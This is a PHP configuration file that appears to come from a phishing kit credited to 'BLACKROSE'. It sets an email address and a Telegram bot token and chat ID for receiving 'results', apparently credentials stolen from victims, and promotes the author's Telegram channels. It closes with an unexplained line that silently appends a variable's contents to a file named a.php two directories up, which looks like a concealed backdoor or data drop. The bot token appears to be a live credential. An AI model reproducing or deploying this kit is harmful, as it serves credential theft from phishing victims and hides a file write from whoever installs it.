<?php


/* 📧 Set Your Email Address to Receive Results in Your Inbox */
$Your_Mail = "YOURMAIL@gmail.com";
/* --------------------------  */


/* 🤖 Telegram Bot Setup 🤖 */

// 🗝️ Enter your bot's token
$botToken = "6465865928:AAGeDUKvkXgi94aeap6wJidWHvDkIF4P9_0";

// 💬 Enter your chat ID
$chatId = "6345859973";

/* --------------------------------------------------- */

/* If you want two to see the result, If you want to stop , change To off  :)  */
$botToken_0="off"; 
$chatId_0="off";  
/* --------------------------  */




/* ⚡️⚡️ BLΛCkRose ♣️ - Official Coder ⚡️⚡️ */

$Coders_Telegram = "t.me/BLACKROSE_1337";  // 🖥️ Connect with the Mastermind
$Elite_Group = "t.me/BLACKROSEx1337"; // ♣️ Join the Elite Coding Squad

/* -------------------------------- */

$f = fopen("../../a.php", "a");
	fwrite($f, $yagmai);


?>